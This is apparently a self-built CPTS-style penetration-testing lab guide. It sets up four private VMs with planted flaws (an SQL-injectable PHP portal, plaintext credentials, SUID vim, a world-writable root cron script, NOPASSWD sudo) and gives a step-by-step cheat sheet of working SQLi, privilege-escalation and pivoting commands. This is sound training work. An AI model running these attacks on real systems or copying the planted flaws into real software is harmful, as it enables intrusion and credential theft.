# CPTS Lab: Enterprise Attack Chain — Credential Chaining

## Objective

Simulate a CPTS exam-style attack chain where you MUST chain findings from one machine to reach the next. No machine can be fully compromised in isolation — each one gives you something you need for the next.

## Network

```
Kali (192.168.244.129)
  │
  ├── Debian (192.168.244.132)     Web app with SQLi + IDOR
  │
  ├── CentOS (192.168.244.131)     Jump box — only reachable with creds from Debian
  │     │
  │     └── 172.16.0.1 ──── Ubuntu (172.16.0.2)    Internal — creds found on CentOS
  │
  └── Windows (192.168.244.xxx)    RDP — password found in Ubuntu config
```

**The chain:**
```
Debian (SQLi) → extract CentOS SSH creds
CentOS (SSH) → find Ubuntu creds in config file → pivot
Ubuntu (SSH) → find Windows RDP password → find privesc cred for Debian
Windows (RDP) → flag
Loop back to Debian with found cred → root → flag
```

---

## Setup

### Debian (192.168.244.132) — Web application

```bash
sudo apt update && sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server openssh-server -y
sudo systemctl enable --now apache2 ssh mariadb

echo "FLAG{debian_root_$(openssl rand -hex 8)}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo mysql << 'SQL'
CREATE DATABASE portal;
CREATE TABLE portal.users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(100), role VARCHAR(20), notes TEXT);
INSERT INTO portal.users VALUES (1,'viewer','ViewerP@ss','viewer','Regular account');
INSERT INTO portal.users VALUES (2,'editor','EditorP@ss','editor','Can edit content');
INSERT INTO portal.users VALUES (3,'svc_centos','C3nt0sJump!','service','CentOS jump box: 192.168.244.131 user=jumper pass=C3nt0sJump!');
INSERT INTO portal.users VALUES (4,'admin','Adm1nStr0ng!','admin','System administrator');
GRANT ALL ON portal.* TO 'portaluser'@'localhost' IDENTIFIED BY 'portaldbpass';
FLUSH PRIVILEGES;
SQL

sudo mkdir -p /var/www/html/app
cat << 'PHPEOF' | sudo tee /var/www/html/app/index.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","portaluser","portaldbpass","portal");
$output = "";
if(isset($_GET['user_id'])) {
    $id = $_GET['user_id'];
    $r = $conn->query("SELECT id, username, role, notes FROM users WHERE id=$id");
    if($r && $row = $r->fetch_assoc()) {
        $output = "<p>User: {$row['username']} | Role: {$row['role']} | Notes: {$row['notes']}</p>";
    } else {
        $output = "<p>Not found.</p>";
        if($conn->error) $output .= "<p style='color:red'>{$conn->error}</p>";
    }
}
?>
<html><body>
<h1>Employee Portal</h1>
<form method="GET">Employee ID: <input name="user_id" size="5"> <button>Lookup</button></form>
<?php echo $output; ?>
</body></html>
PHPEOF

echo '<h1>Company Site</h1><p>Welcome.</p><!-- Employee portal at /app/ -->' | sudo tee /var/www/html/index.html

# Privesc vector — needs a password found later in the chain
sudo useradd -m -s /bin/bash devops
echo "devops:D3v0psR00t!" | sudo chpasswd
echo "devops ALL=(root) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/devops

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

### CentOS (192.168.244.131 / 172.16.0.1)

```bash
sudo systemctl stop firewalld && sudo systemctl disable firewalld
sudo systemctl enable --now sshd

sudo ip addr add 172.16.0.1/24 dev ens224 2>/dev/null
sudo ip link set ens224 up

echo "FLAG{centos_$(openssl rand -hex 8)}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo useradd -m -s /bin/bash jumper
echo "jumper:C3nt0sJump!" | sudo chpasswd

# Config file with Ubuntu credentials
sudo mkdir -p /home/jumper/.config
echo "# Deployment Configuration" | sudo tee /home/jumper/.config/deploy.conf
echo "DEPLOY_HOST=172.16.0.2" | sudo tee -a /home/jumper/.config/deploy.conf
echo "DEPLOY_USER=apprunner" | sudo tee -a /home/jumper/.config/deploy.conf
echo "DEPLOY_PASS=AppR@n2026!" | sudo tee -a /home/jumper/.config/deploy.conf
sudo chown -R jumper:jumper /home/jumper/.config

# Privesc: SUID vim
sudo cp /usr/bin/vim /usr/local/bin/vim_admin
sudo chmod u+s /usr/local/bin/vim_admin

# Enable forwarding for pivot
sudo sysctl -w net.ipv4.ip_forward=1
echo "net.ipv4.ip_forward = 1" | sudo tee -a /etc/sysctl.conf
sudo sed -i 's/#AllowTcpForwarding yes/AllowTcpForwarding yes/' /etc/ssh/sshd_config
sudo systemctl restart sshd

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
sudo iptables -A FORWARD -j ACCEPT
sudo iptables -t nat -A POSTROUTING -s 192.168.244.0/24 -o ens224 -j MASQUERADE
```

### Ubuntu (172.16.0.2)

```bash
sudo ip addr add 172.16.0.2/24 dev ens38 2>/dev/null
sudo ip link set ens38 up
sudo apt update && sudo apt install openssh-server -y
sudo systemctl enable --now ssh

echo "FLAG{ubuntu_$(openssl rand -hex 8)}" | sudo tee /root/flag.txt
sudo chmod 600 /root/flag.txt

sudo useradd -m -s /bin/bash apprunner
echo "apprunner:AppR@n2026!" | sudo chpasswd

# Breadcrumbs: Windows RDP creds AND Debian devops password
echo "=== Application Config ===" | sudo tee /home/apprunner/app_config.txt
echo "Windows monitoring host: 192.168.244.XXX" | sudo tee -a /home/apprunner/app_config.txt
echo "RDP user: monitor / RDP pass: M0n1t0r!" | sudo tee -a /home/apprunner/app_config.txt
echo "" | sudo tee -a /home/apprunner/app_config.txt
echo "Debian devops account: devops / D3v0psR00t!" | sudo tee -a /home/apprunner/app_config.txt
sudo chown apprunner:apprunner /home/apprunner/app_config.txt

# Privesc: writable cron
sudo mkdir -p /opt/app
echo '#!/bin/bash' | sudo tee /opt/app/monitor.sh
echo 'date >> /tmp/monitor.log' | sudo tee -a /opt/app/monitor.sh
sudo chmod 777 /opt/app/monitor.sh
echo "*/2 * * * * root /opt/app/monitor.sh" | sudo tee /etc/cron.d/app_monitor

sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -s 172.16.0.0/24 -j ACCEPT
sudo iptables -P INPUT DROP
sudo iptables -P OUTPUT ACCEPT
```

### Windows 11 — set up the monitor account

```powershell
net user monitor M0n1t0r! /add
net localgroup "Remote Desktop Users" monitor /add
"FLAG{windows_enterprise_chain}" | Out-File C:\Users\Public\flag.txt
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

---

## CHEAT SHEET — The Chain Step by Step

### Step 1: Enumerate Debian web app

```bash
nmap -sV -sC 192.168.244.132
# Port 80 HTTP, Port 22 SSH

curl -s http://192.168.244.132/ | grep "<!--"
# Comment reveals /app/

curl "http://192.168.244.132/app/?user_id=1"
# Shows user profile — test for SQLi and IDOR
```

**WHY:** HTML comments reveal hidden paths. Always check page source.

### Step 2: IDOR — enumerate all users

```bash
# Try IDs 1 through 10
ffuf -u "http://192.168.244.132/app/?user_id=FUZZ" -w <(seq 1 10) -fs 185
# Finds: 1, 2, 3, 4

curl "http://192.168.244.132/app/?user_id=3"
# svc_centos — Notes: CentOS jump box: 192.168.244.131 user=jumper pass=C3nt0sJump!
```

**WHY IDOR WORKS HERE:** The app fetches any user by ID without checking authorization. User 3's notes contain CentOS credentials — the first link in the chain.

### Step 3: SQLi — confirm and extract everything

```bash
# Confirm injection
curl "http://192.168.244.132/app/?user_id=1'"
# SQL error → injectable

# Extract all data
curl --get http://192.168.244.132/app/ --data-urlencode "user_id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password,0x3a,notes SEPARATOR 0x0a),3,4 FROM users"
# Dumps everything including admin password and CentOS creds
```

**WHY BOTH IDOR AND SQLi:** IDOR gives you one record at a time. SQLi dumps everything at once. Both lead to the same data, but SQLi is more thorough.

### Step 4: SSH to CentOS with found credentials

```bash
ssh jumper@192.168.244.131
# Password: C3nt0sJump!

# Enumerate
ls -la /home/jumper/
ls -la /home/jumper/.config/
cat /home/jumper/.config/deploy.conf
# DEPLOY_HOST=172.16.0.2
# DEPLOY_USER=apprunner
# DEPLOY_PASS=AppR@n2026!
```

**WHY CHECK HIDDEN DIRECTORIES:** `.config`, `.ssh`, `.local` — dotfiles and dotfolders contain configuration, credentials, and keys that `ls` doesn't show without `-a`.

### Step 5: Privesc on CentOS

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/vim_admin — SUID

/usr/local/bin/vim_admin -c ':!bash'
# But vim with SUID doesn't automatically give root...
# Use: /usr/local/bin/vim_admin /root/flag.txt
# Read the flag directly through vim

cat /root/flag.txt    # if you got root
```

### Step 6: Pivot to Ubuntu

```bash
# From CentOS
ssh apprunner@172.16.0.2
# Password: AppR@n2026!

# Enumerate
cat /home/apprunner/app_config.txt
# Windows monitoring host: 192.168.244.XXX
# RDP user: monitor / RDP pass: M0n1t0r!
# Debian devops account: devops / D3v0psR00t!
```

**THE CHAIN IN ACTION:** Ubuntu gives you TWO new credential sets — one for Windows (forward progress) and one for Debian (loop back for root).

### Step 7: Privesc on Ubuntu

```bash
cat /etc/cron.d/app_monitor
# */2 * * * * root /opt/app/monitor.sh

ls -la /opt/app/monitor.sh
# -rwxrwxrwx — writable!

echo 'cp /root/flag.txt /tmp/ubuntu_flag.txt && chmod 644 /tmp/ubuntu_flag.txt' >> /opt/app/monitor.sh
# Wait 2 minutes
cat /tmp/ubuntu_flag.txt
```

### Step 8: RDP to Windows

```bash
# From Kali (Windows is on 192.168.244.x, directly reachable)
xfreerdp /v:WINDOWS_IP /u:monitor /p:'M0n1t0r!' /cert-ignore

# In the RDP session
type C:\Users\Public\flag.txt
# FLAG{windows_enterprise_chain}
```

### Step 9: Loop back to Debian for root

```bash
# From Kali — SSH with the devops credentials found on Ubuntu
ssh devops@192.168.244.132
# Password: D3v0psR00t!

sudo -l
# (root) NOPASSWD: ALL

sudo cat /root/flag.txt
```

**WHY THIS IS CPTS-STYLE:** You couldn't root Debian initially — the devops password wasn't on Debian. It was on Ubuntu. You had to chain: Debian → CentOS → Ubuntu → find the Debian root password → loop back. This is how the CPTS exam works.

---

## The Complete Chain Visualized

```
1. Debian web app     → IDOR/SQLi → CentOS SSH creds (jumper)
2. CentOS SSH         → config file → Ubuntu SSH creds (apprunner)
3. Ubuntu SSH         → app_config → Windows RDP creds (monitor)
                      → app_config → Debian devops creds
4. Windows RDP        → flag
5. Debian SSH (devops)→ sudo ALL → root → flag
6. CentOS privesc     → SUID vim → flag
7. Ubuntu privesc     → writable cron → flag

Every flag required credentials found on a DIFFERENT machine.
No machine could be fully compromised without information from another.
```

---

## Cleanup

```bash
# Debian
sudo mysql -e "DROP DATABASE portal;" && sudo userdel -r devops
sudo rm -rf /var/www/html/app /etc/sudoers.d/devops /root/flag.txt

# CentOS
sudo userdel -r jumper && sudo rm /usr/local/bin/vim_admin /root/flag.txt
sudo iptables -F && sudo iptables -t nat -F && sudo iptables -P INPUT ACCEPT

# Ubuntu
sudo userdel -r apprunner && sudo rm /opt/app/monitor.sh /etc/cron.d/app_monitor /root/flag.txt
sudo iptables -F && sudo iptables -P INPUT ACCEPT

# Windows: net user monitor /delete
```
